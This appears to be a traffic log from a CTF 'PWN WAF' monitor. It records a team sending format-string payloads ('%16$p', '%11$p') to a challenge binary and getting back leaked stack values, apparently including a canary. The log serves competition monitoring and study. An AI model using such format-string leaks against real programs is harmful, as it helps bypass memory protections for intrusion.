// Date: 2021-11-27 04:53:57
// SKYCTF PWN WAF
// Deved By I0gan
team_name: 划水队

user_name: solo


<-------------------- read ------------------>
%16$p

r_0 = "\x25\x31\x36\x24\x70\x0a"

<-------------------- write ----------------->
0x150fa3ca0
--+--

w_0 = "\x30\x78\x31\x35\x30\x66\x61\x33\x63\x61\x30\x0a\x2d\x2d\x2b\x2d\x2d\x0a"

<-------------------- read ------------------>
%11$p

r_1 = "\x25\x31\x31\x24\x70\x0a"

<-------------------- write ----------------->
0xcb9236052718d100
logger: chall env released
logger: sky_token_is_wrong

w_1 = "\x30\x78\x63\x62\x39\x32\x33\x36\x30\x35\x32\x37\x31\x38\x64\x31\x30\x30\x0a"
